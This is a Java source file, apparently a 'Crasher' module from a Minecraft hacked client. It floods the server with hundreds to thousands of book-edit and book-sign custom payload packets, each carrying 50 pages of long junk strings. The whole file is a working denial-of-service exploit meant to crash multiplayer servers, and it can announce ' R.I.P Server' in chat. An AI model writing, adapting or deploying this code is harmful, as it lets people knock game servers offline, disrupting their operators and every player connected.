package me.Oxygen.modules.world;

import java.util.Random;

import io.netty.buffer.Unpooled;
import me.Oxygen.modules.Category;
import me.Oxygen.modules.Module;
import me.Oxygen.modules.ModuleRegister;
import me.Oxygen.value.Value;
import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

@ModuleRegister(name = "Crasher", category = Category.PLAYER)
public class Crasher extends Module {
	   private Value<Double> packets = new Value<Double>("Crasher_Packets", 200.0D, 50.0D, 2000.0D, 10.0D);
	   private Value<Boolean> message = new Value<Boolean>("Crasher_SendMessage", false);

	   public void onEnable() {
	      if(this.message.getValueState()) {
	         this.tellPlayer(" R.I.P Server", "[Crasher]");
	      }

	      for(int e = 0; e <= this.packets.getValueState().intValue(); ++e) {
	         triggerLOL();
	      }

	      try {
	         this.set(false);
	      } catch (Exception var2) {
	         var2.printStackTrace();
	      }

	   }

	   private final void triggerLOL() {
	      Minecraft.getMinecraft();
	      NetHandlerPlayClient sendQueue = Minecraft.getMinecraft().getNetHandler();

	      try {
	         ItemStack bookObj = new ItemStack(Items.writable_book);
	         String author = "xDark" + Math.random() * 400.0D;
	         String title = "LOL KEK " + Math.random() * 400.0D;
	         String mm255 = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
	         NBTTagCompound tag = new NBTTagCompound();
	         NBTTagList list = new NBTTagList();

	         for(int s2 = 0; s2 < 50; ++s2) {
	            String packetbuffer = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
	            NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
	            list.appendTag(tString);
	         }

	         tag.setString("author", author);
	         tag.setString("title", title);
	         tag.setTag("pages", list);
	         if(bookObj.hasTagCompound()) {
	            NBTTagCompound var11 = bookObj.getTagCompound();
	            var11.setTag("pages", list);
	         } else {
	            bookObj.setTagInfo("pages", list);
	         }

	         String var12 = "MC|BEdit";
	         if((new Random()).nextBoolean()) {
	            var12 = "MC|BSign";
	         }

	         bookObj.setTagCompound(tag);
	         PacketBuffer var13 = new PacketBuffer(Unpooled.buffer());
	         var13.writeItemStackToBuffer(bookObj);
	         Minecraft.getMinecraft();
	         Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C17PacketCustomPayload(var12, var13));
	      } catch (Exception var10) {
	         ;
	      }

	   }
	}

